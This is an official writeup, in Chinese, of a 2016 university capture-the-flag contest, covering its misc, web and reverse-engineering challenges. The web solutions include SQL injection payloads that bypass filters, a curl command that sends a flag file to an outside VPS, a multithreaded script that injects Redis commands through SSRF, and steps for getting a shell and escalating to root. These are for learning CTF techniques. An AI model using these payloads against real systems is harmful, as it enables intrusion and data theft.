# 【CTF攻略】第七届swpu-ctf官方Writeup

阅读量 **274520**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-10-28 17:19:52

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

**作者：**[ **08067**](http://bobao.360.cn/member/contribute?uid=2652321373)

**预估稿费：300RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿**

**比赛地址：**[ **ctf.08067.me** ****](http://ctf.08067.me/)

**misc 100-1**

* * *

[http://misc.08067.me/misc4](http://misc.08067.me/misc4/)

misc 100-1 很简单，就是jsfuck和brianfuck两次编码，直接解出即可。

  

**Misc 100-2**

* * *

<http://misc.08067.me/misc3/>

Misc 100-2题目给的是一个图片，用winhex打开看到底部的密文

Base32解密得到：vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}

发现是凯撒加密，不过奇偶数移位方向不一样，发现偏移量是16，用脚本跑一下

    
    
    str = "vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}"
    for i in range(26):
        key = ''
        for x in str:
            s = ord(x)
            if (s not in range(97,123)) and (s not in range(65,91)):
                key = key + chr(s)
            else:
                #print chr(s)
                if s in range(97,123):
                    if s % 2 == 0:
                        s = s - i
                        if s not in range(97,123):
                            t = 97-s
                            t = 123-t
                            key = key + chr(t)
                        else:
                            key = key + chr(s)
                    else:
                        s = s + i
                        if s not in range(97,123):
                            t = s-122+96
                            key = key + chr(t)
                        else:
                            key = key + chr(s)
                else:
                    #print chr(s)
                    if s % 2 == 0:
                    s = s - i
                        if s not in range(65,91):
                            t = 65-s
                            t = 91-t
                            key = key + chr(t)
                        else:
                            key = key + chr(s)
                    else:
                        s = s + i
                        if s not in range(65,91):
                            t = s-90+64
                            key = key + chr(t)
                        else:
                            key = key + chr(s)
        print key

**  
**

**Misc 150**

* * *

<http://misc.08067.me/misc2/>

打开wireshark数据包，提取http数据，得到一个flag.zip，

解压得到一个ce.txt文件，打开发现是一个rgb图片的像素点，然后用脚本还原即可。

    
    
    from PIL import Image
    import re
    if __name__ == '__main__':
        x = 887
        y = 111
        i = 0
        j = 0
        
        c = Image.new("RGB", (x,y))
        file_object = open('ce.txt')
        
        for i in range(0,  x):
            for j in range(0,  y):
                line = file_object.next()
                lst = line.split(",")
                c.putpixel((i, j), (int(lst[0]), int(lst[1]), int(lst[2])))
        
        c.show()
        c.save("c.png")

**web 200-1**

* * *

<http://web1.08067.me/>

注入，过滤了空格、#、*、union、like、regexp、and、or、|、–、&、%0a、%0b、%0c、%0d等，需要想办法用其他操作符连接注入语句和闭合’。

mysql操作符参考：<http://blog.csdn.net/yuzongtao/article/details/45044963>

几个可用的poc：

    
    
    uname='!=!!(ascii(mid((passwd)from(1)))=99)!=!!'1&passwd=dddd
    
    
    uname=12'%(ascii(mid((passwd)from(1)))=99)%'1&passwd=dddd
    
    
    uname=12'%(ascii(mid((passwd)from(1)))=99)^'1&passwd=dddd
    
    
    uname=12'-(length(trim(leading%a0'c12'%a0from%a0passwd))<32)-'0&passwd=1

来到后台，可以执行命令，但是对反弹shell的一些关键字做了过滤，对空格也做了过滤，只能通过cat读取flag，没又回显，然后打到用远程vps的日志上面

exp：

curl$IFSvps:1234/`cat$IFS../../flag`

  

**web 200-2**

* * *

<http://web3.08067.me/>

这道题主要是考察了php底层 wakeup 的一个bug，<https://bugs.php.net/bug.php?id=72663>

这道题根据tips:编辑器，可以考虑到.bak文件泄露

通过 robots.txt 发现了 function.php commom.php ,

最后找到了 function.php.bak index.php.bak

我们就获得了 整道题的代码

Index.php.bak

我们可以看见了这里 通过 cookie 的登陆

/function.php.bak

其他过滤代码 在该文件都可以得到

addslashes_deep() 是无法绕过的，我们就只能绕过wakeup

根据那个bug 的描述，我们直接进入 __destruct() ,这里我们取出了 $this->name

$this->name 是base64decode后，然后反序列化得到的，不用考虑waf等东西

我们看了这里只有一个 Checksql($sql)

    
    
    //sql 过滤 
    static function CheckSql($db_string,$querytype='select') 
    { 
    $clean = ''; 
    $error=''; 
    $old_pos = 0; 
    $pos = -1; 
    if($querytype=='select') 
    { 
    $notallow1 = "[^0-9a-z@._-]{1,}(load_file|outfile)[^0-9a-z@.-]{1,}"; 
    if(preg_match("/".$notallow1."/i", $db_string)) 
    { 
    exit("Error"); 
    } 
    } 
    //完整的SQL检查 
    while (TRUE) 
    { 
    $pos = strpos($db_string, ''', $pos + 1); 
    if ($pos === FALSE) 
    { 
    break; 
    } 
    $clean .= substr($db_string, $old_pos, $pos - $old_pos); 
    while (TRUE) 
    { 
    $pos1 = strpos($db_string, ''', $pos + 1); 
    $pos2 = strpos($db_string, '\', $pos + 1); 
    if ($pos1 === FALSE) 
    { 
    break; 
    } 
    elseif ($pos2 == FALSE || $pos2 > $pos1) 
    { 
    $pos = $pos1; 
    break; 
    } 
    $pos = $pos2 + 1; 
    } 
    $clean .= '$s$'; 
    $old_pos = $pos + 1; 
    } 
    $clean .= substr($db_string, $old_pos); 
    $clean = trim(strtolower(preg_replace(array('~s+~s' ), array(' '), $clean))); 
    if (strpos($clean, '@') !== FALSE OR strpos($clean,'char(')!== FALSE OR strpos($clean,'"')!== FALSE 
    OR strpos($clean,'$s$$s$')!== FALSE) 
    { 
    $fail = TRUE; 
    if(preg_match("#^create table#i",$clean)) $fail = FALSE; 
    $error="unusual character"; 
    } 
    elseif (strpos($clean, '/*') !== FALSE ||strpos($clean, '-- ') !== FALSE || strpos($clean, '#') !== FALSE) 
    { 
    $fail = TRUE; 
    $error="comment detect"; 
    } 
    elseif (strpos($clean, 'sleep') !== FALSE && preg_match('~(^|[^a-z])sleep($|[^[a-z])~is', $clean) != 0) 
    { 
    $fail = TRUE; 
    $error="slown down detect"; 
    } 
    elseif (strpos($clean, 'benchmark') !== FALSE && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~is', $clean) != 0) 
    { 
    $fail = TRUE; 
    $error="slown down detect"; 
    } 
    elseif (strpos($clean, 'load_file') !== FALSE && preg_match('~(^|[^a-z])load_file($|[^[a-z])~is', $clean) != 0) 
    { 
    $fail = TRUE; 
    $error="file fun detect"; 
    } 
    elseif (strpos($clean, 'into outfile') !== FALSE && preg_match('~(^|[^a-z])intos+outfile($|[^[a-z])~is', $clean) != 0) 
    { 
    $fail = TRUE; 
    $error="file fun detect"; 
    } 
    if (!empty($fail)) 
    { 
    exit("Error" . $error); 
    } 
    else 
    { 
    return $db_string; 
    } 
    } 
    }

这就是改版的80sec-ids ，这里只要研究一下就会发现，这里可用sleep() 函数，绕过80sec-ids 进行盲注，就可以得到flag了.

  

**web 100**

* * *

<http://web2.08067.me/>

这是一道基于php特殊协议的利用的题目。

根据首页提示，可以发现include.php页面存在文件包含漏洞，利用参数file,右键源码查看获tips：upload.php。上传加文件包含很容易想到getshell。

首先利用php://filter读取两个文件的源码，可以发现只能上传图片文件，并且file参数后强行加了php后缀，又过滤了..，所以不能跨目录，php版本为5.5，也不存在截断。而且这个环境并不支持zip协议，于是只有利用phar://协议getshell。

构造xxx.zip文件，里面加入我们的一句话文件并压缩，改名为图片后缀名上传，最后getshell，exp如下：

  

**Web 200 -3**

* * *

<http://web2.08067.me/>

这道题是接着web100之后的，拿到web100的shell后，就会在根目录下发现tips文件，

获得hint: tomcat.08067.me以及flag2在root目录下，这很容易让人想到需要提权。

访问tomcat.08067.me这个地址后，发现tomcat的管理后台是404，也就是说一些常规的tomcat部署war的漏洞无法利用，但又需要提权所以很容易联想到最近爆出(CVE-2016-1240)tomcat本地提权漏洞。这样就需要从apache权限用户获得一个tomcat用户权限，这个地方确实有一点小脑洞。

我们设置了tomcat的web根目录为apache可写，这样就可以通过菜刀翻到tomcat的web根目录写入jsp一句话获得tomcat权限，最后再上exp获取root权限即可。

参考地址：<http://www.freebuf.com/vuls/115862.html>

利用过程中注意事项:

1.写入exp的时候注意windows下的换行是rn，而linux下的是n.

2.获取tomcat的webshell后最好反弹一个shell到自己的vps上，用交互式shell更方便操作。

(这个题上线的前一天，出现了脏牛漏洞，导致很多师傅在服务器上尝试用脏牛提权。所以服务器会崩溃，最后写了定时回滚脚本解决。)

  

**web 200-4**

* * *

<http://web7.08067.me/web7>

这个题是用cherry写的，一个轻量级的python web框架,在400错误的时候就可以知道。前端写

得比较烂，直接一个表单加张背景图片。~/~

这个题是利用了Python urllib HTTP头注入向然后造成ssrf，操作redis可以更改管理员账号密码，然后登录。但是提示fast fast
fast。

其实是后台有个脚本在一直修改账号密码，所以导致登录不成功，所以需要多线程去操作redis修改账号面膜然后登录。(这里有脑洞，已吊打出题人）

脚本实现

    
    
    import requests
    import threading
    def test():
        while True:
            try:
                url = "http://web7.08067.me/web7/input"
                data = {'value': 'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'}
                requests.post(url, data=data)
            except Exception, e:
                pass
    def test2():
        while True:
            try:
                url = "http://web7.08067.me/web7/admin"
                data = {'passworld': 'xx00'}
                text = requests.post(url, data=data).text
                if 'flag' in text:
                    print text
            except:
                pass
    list = []
    for i in range(10):
        t = threading.Thread(target=test)
        t.setDaemon(True)
        t.start()
        list.append(t)
    for i in range(10):
        t = threading.Thread(target=test2)
        t.setDaemon(True)
        t.start()
        list.append(t)
    for i in list:
        i.join()

  

**web 300**

* * *

<http://web5.08067.me/>

这个题一看界面，就想到时ssrf

经过测试，可以直接发起请求，也没有任何的内网地址过滤。然后就是寻找内网段。

这里就是利用file://协议去读本机的网卡。

centos的网卡地址/etc/sysconfig/network-scripts/ifcfg-eth0。

然后得到这台主机 所处的内网的网段是在172.16.181.0/24段。

然后探测下C段，发现只有172.16.181.166主机的80 存在一个应用。

尝试扫一波目录，发现了一个常规目录admin/login.php,访问之，发现一个登陆表单

不过，这里的method是POST

既然是POST，自然就想到了利用gopher协议构造POST包。这里开始 就需要特别细心了。

大概有以下几点：

1.这里的表单action是wllmctf_login.php而不是login.php,很多师傅就是这里被坑了一波。

2.gopher发包一定要填写端口，因他不像http默认走80端口。

3.注意post包里面的Content-Length的长度一定要和post的内容长度相符合，很多师傅这个地方都忘记了，导致被坑了很久

4.记得加上Content-Type: application/x-www-form-urlencoded，然后记得是两次url编码

大概的构造好之后的poc如下图，

可以看到，这里用户名错误会报error names，如果密码错误回返回password error。

很容易测出来这个这个地方有注入，什么都没有过滤，是bool盲注，所以只接就能写脚本跑用户名密码。

最后得到用户名是admin，跑出的密码MD5解密之后是xiaozhang123.

最后填入正确用户名和密码。得到flag

这个题不难，贵在一定要细心啊

  

**web 400**

* * *

<http://web4.08067.me/>

这是一道代码审计的题，访问 /web.zip 就拿到了源码，

我们在 riji.php 这里发现了

由于是伪全局 机制，我们这里可以发现一个变量覆盖，只要在登陆后，让查询用户不存在就可以了，

下面漏洞触发点为

再看 api.php, 我们这里看见了 del_user 操作，只要删除了用户，我们就可以触发上面的变量覆盖漏洞了，

权限确认这里，一看这种校验方式 就会发现存在 hash扩展攻击，然后我们需要找到 admin 的key 的一个密文就可以构造密文，绕过权限验证了，

Forget.php 找回密码处

我们发现了可以获取任意用户key的md5加密的密文，这里hash扩展攻击的条件已经满足

我们再来继续看看 api.php

这里我们就需要找到当前用户的id才能删除我们的用户，

/index.php 就会将 userid 写入到 cookie 中，删除条件就满足了

所以整体逻辑就是，先登录用户，抓取 userid ，然后找回 管理员(admin) 的密码

然后 通过api.php 接口删除用户，我们用登陆后的用户访问 riji.php ，传入 id 参数

就可以了，这里没有任何过滤，直接联合查询，就查到了flag

  

**CM50**

* * *

<http://misc.08067.me/CM50/>

第一眼看题。 好直接上工具！ eXeScope

  

哒~哒 就在这里！

**  
**

**CM100**

* * *

[http://misc.08067.me/CM5100/](http://misc.08067.me/CM50/)

直接丢IDA 然后搜字符窜。Wrong~ 找到关键函数。仔细看看其实算法很简单只是其余处理稍微复杂。其实就是一步异或操作。寻找到常量 26544631 和
12345678 进行异或。

Flag出来了

Flag{lr{-l0F-)uFe?}

  

**CM150**

* * *

[http://misc.08067.me/CM150/](http://misc.08067.me/CM50/)

Apk逆向出题人不太会，直接贴源码吧！

    
    
    encode = Encode1(Flag,Flag.length());
              encode1 = Encode2(encode,Flag);
              flag = check(encode1);
                  if (flag==1)
                    {
                     Toast.makeText(MainActivity.this, "WOw~, You got it !", Toast.LENGTH_SHORT).show();
                      }
                     else
                     {
                      Toast.makeText(MainActivity.this, "trg again~", Toast.LENGTH_SHORT).show();

两个加密函数，一个检查函数，进去

    
    
    public String Encode1(String Flag , int len)
    {
    char [] xor = Flag.toCharArray();
    int key = 29; 
    int temp;
    int [] encode = new int [16];
    if (len == 16)
    {
    for (int i = 0;i<Flag.length();i++)
    {
    encode[i] = (int)xor[i];
    encode[i] = encode[i]^key;
    }
    for (int i = 1 ; i< 8 ; i++)
    {
    temp = encode[i];
    encode[i] = encode[15-i];
    encode[15-i] = encode[i];
    }
    for (int i = 0 ; i< 16 ; i++)
    {
    xor[i] = (char)encode[i];
    }
    return String.valueOf(xor);
    }
    else{
    Flag = "lalalalalalala~~";
    return Flag;
    }
    }
    public String Encode2(String encode,String Flag)
    {
    char [] xor1 = encode.toCharArray();
    char [] xor2 = Flag.toCharArray();
       for (int i = 0;i<16;i++)
    {
    if (i%2 == 0)
    xor1[i] = xor2[i];
    }
       return String.valueOf(xor1);
     
    }
    public int check(String encode1)
    {
    char [] xor = encode1.toCharArray();
    int []sum = new int [16];
    int []sum1 = {73, 48, 109, 97, 115, 46, 95, 116, 105, 111, 51, 89, 124, 73, 45, 73};
    for (int i = 0 ; i< 16; i++)
    {
    sum[i] = (int)xor[i];
    if(sum[i] != sum1[i])
    return 0;
     
    }
    return 1;
    }

由于出题人水平问题，导致此题有多解(已被吊打)

  

**CM200**

* * *

[http://misc.08067.me/CM200/](http://misc.08067.me/CM50/)

CM200其实就是RC4的应用。下GetWindowText断下来，出题人VM了两个函数强行加大了难度，但是从其他调用函数还是能够看出来是RC4。识别出来了是RC4，剩下就是找key
和 Ecode了。

关于key：

你很容易就能找到 swpu。

关于Ecode：

0x34, 0x73, 0xffffffaa, 0xffffffd9, 0xffffff88, 0x10, 0xfffffff7, 0xffffffab,
0xffffffbb, 0x7, 0xffffffc6, 0xffffff8b, 0xffffffd1, 0xffffff92, 0x20,
0xffffffed, 0x25, 0x2f, 0x32, 0x27, 0xffffffdc

转一下再解RC4

Flag出来了

Flag{y3s_Is_tH3_LaSt}

当然这道题还有其他解题思路，我也从其他大牛那里学到了按位爆破。

CM300：

[http://misc.08067.me/CM300/](http://misc.08067.me/CM50/)

CM300分为两个部分第一个为key 和 第二个部分 flag

Key输入进行md5加密。找到常量186, 23, 99, 168, 254, 185, 21, 172, 61, 195, 239, 219, 52,
229, 129, 55转为16进制。再去解md5就OK。

Flag部

直接贴码了

    
    
    void Encode1(unsigned char *decrypt, unsigned char *Flag)
    {
    for ( int i = 0; i < 16; i++)
    {
     
    Flag[i] ^= decrypt[i];
    if (i % 2 == 0 && i < 9)
    Flag[i] -= 40;
    if (i % 2 != 0 && i < 9)
    Flag[i] += 1;
    if (i>=9)
    {
    if (i < 12)
    Flag[i] -= 50;
    else
    Flag[i] -= 9;
    }
    }
     
    }
     
    void Encode2(unsigned char *decrypt, unsigned char * Flag)
    {
    for (int i = 0; i < 16; i++)
    {
    Flag[i] ^= 29;
     
    if (i%2 != 0)
    {
    Swap(&Flag[i-1],&Flag[i]);
    }
    }
    Encode1(decrypt, Flag);
     
    }
     
    void Swap(unsigned char *p1, unsigned char *p2)
    {
    char temp;
    temp = *p1;
    *p1 = *p2;
    *p2 = temp;
    }
     
     
    int Decode(unsigned char * Flag)
     
    {
    int i = Flag[0] - 199 + Flag[1] - 171 + Flag[2] - 93 + Flag[3] - 153 + Flag[4] - 6 + Flag[5] - 38 + Flag[6] - 127 + Flag[7] - 76 + Flag[8] - 79 + Flag[9] - 177 + Flag[10] - 67 + Flag[11] - 29 + Flag[12] - 122 + Flag[13] - 144 + Flag[14] - 135 + Flag[15] - 230 - 15;
    return i;
    }

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **08067** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84814](/post/id/84814)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) 08067

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

